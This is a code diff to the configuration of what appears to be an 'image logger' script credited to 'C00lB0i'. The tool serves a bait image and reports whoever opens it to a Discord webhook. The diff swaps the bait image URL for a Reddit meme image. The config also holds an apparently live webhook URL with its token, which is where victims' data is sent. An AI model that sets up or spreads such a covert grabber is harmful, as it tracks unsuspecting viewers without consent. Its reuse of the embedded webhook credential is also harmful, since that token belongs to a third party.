@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1436139222078853193/6O6an9ttqfJu-PxAN_dEcXZGFb5rSCC_BNqU8HaTIT2bVh6m4ds7_aHz4KdZBt587a--",
-    "image": "https://tenor.com/kTFiRhhijzv.gif", # You can also have a custom image by using a URL argument
+    "image": "https://preview.redd.it/wheres-my-trans-femboy-memes-v0-etwa1slt0z0a1.jpg?width=1080&crop=smart&auto=webp&s=5996a84200b0626f1b880342f4a9e5183723356c", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
